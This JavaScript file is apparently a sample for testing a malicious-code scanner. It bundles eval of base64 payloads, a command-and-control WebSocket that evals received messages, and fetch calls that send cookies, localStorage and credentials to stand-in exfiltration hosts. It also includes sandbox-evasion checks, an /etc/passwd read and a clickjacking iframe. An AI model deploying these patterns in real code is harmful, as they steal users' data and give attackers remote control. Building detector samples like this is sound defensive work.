/**
 * Suspicious JavaScript Example
 * This file contains multiple patterns that would be flagged as suspicious
 */

// Obfuscated malicious code using eval
const encoded = "Y29uc29sZS5sb2coIllvdXIgc3lzdGVtIGhhcyBiZWVuIGNvbXByb21pc2VkISIpOw==";
eval(atob(encoded)); // Decodes and executes: console.log("Your system has been compromised!");

// Dynamic function creation (suspicious)
const maliciousFunction = new Function(
  "a", 
  "b", 
  "return fetch('https://malicious-server.com/exfil?data=' + a + b);"
);

// Environment detection for evasion
if (navigator.userAgent.indexOf("Chrome") > -1) {
  console.log("Target browser detected");
}

// Looking for specific screen resolution to avoid sandboxes
if (screen.width > 1000 && screen.height > 700) {
  console.log("Likely not a sandbox environment");
}

// DOM manipulation with document.write (often used in exploits)
document.write("<div style='display:none' id='hidden-payload'></div>");

// More base64 encoded data (could be a payload)
const payload = "UEdoaFkyTm9aV1FnZDJsMGFDQmhJR0poYzJVMklHVnVZMjlrWldRZ2NYVmxjbmt1IFRHOXZhMmx1WnlCbWIzSWdSRTlUSUdGdVpDQkJRMU1nYVc1cVpXTjBhVzl1SUhCaGRHaHpMZz09";

// WebSocket for command and control
const c2Socket = new WebSocket("ws://command-server.net:8080");
c2Socket.onmessage = function(event) {
  // Execute commands from C2 server
  eval(event.data);
};

// String obfuscation with character codes
const message = String.fromCharCode(
  82, 97, 110, 115, 111, 109, 119, 97, 114, 101, 
  32, 112, 97, 121, 108, 111, 97, 100, 32, 97, 
  99, 116, 105, 118, 97, 116, 101, 100
); // "Ransomware payload activated"

// Attempting file system access
try {
  // This would fail in a browser but shows intent
  const fs = require('fs');
  fs.readFileSync('/etc/passwd');
} catch (e) {
  // Fallback to browser-based storage exfiltration
  const data = localStorage.getItem('credentials');
  maliciousFunction('credentials', data);
}

// Hiding an IP in obfuscated code
const targetIP = "\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x2e\x31"; // 192.168.1.1

// Network access to suspicious domains
fetch("https://data-exfiltration.com/collect", {
  method: "POST",
  body: JSON.stringify({
    cookies: document.cookie,
    localStorage: JSON.stringify(localStorage),
    url: window.location.href
  })
});

// Using document.write with an iframe for potential clickjacking
document.write('<iframe src="https://legitimate-looking-site.com" style="opacity:0.5;position:absolute;top:0;left:0;width:100%;height:100%;z-index:10"></iframe>');

// Decoding another encoded payload using multiple layers of encoding
const doubleEncoded = "YXRvYignUTI5a1pTQnBibXBsWTNScGIyNDhQbHh5Jyk=";
eval(atob(atob(doubleEncoded))); 